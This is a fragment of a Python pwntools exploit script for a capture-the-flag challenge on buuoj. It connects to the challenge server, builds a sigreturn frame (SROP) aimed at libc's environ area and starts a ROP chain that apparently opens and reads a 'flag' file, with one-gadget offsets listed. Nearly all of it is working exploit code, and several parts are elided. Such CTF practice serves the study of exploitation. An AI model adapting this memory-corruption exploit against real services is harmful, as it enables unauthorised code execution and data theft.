...
while True :
	# try :
		if len(sys.argv)==1 :
			...
			io=remote('node3.buuoj.cn',26063)
			elf=ELF('./vn_pwn_babybabypwn_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		...
		srop=SigreturnFrame()
		srop.rax=0
		srop.rsp=libc.sym['environ']+8
		srop.rdi=0
		srop.rsi=libc.sym['environ']
		srop.rdx=0x200
		srop.rip=0x00000000000bc375+libc_base
		
		# gdb.attach(io)
		# pause()
		io.send(str(srop)[8:])
		pay='flag\x00\x00\x00\x00'
		pay+=p64(pop_rdi)+p64(libc.sym['environ'])
		...
		pay+=p64(pop_rdx_rsi)
		pay+=p64(0x100)
		pay+=p64(libc.sym['environ']+0x100)
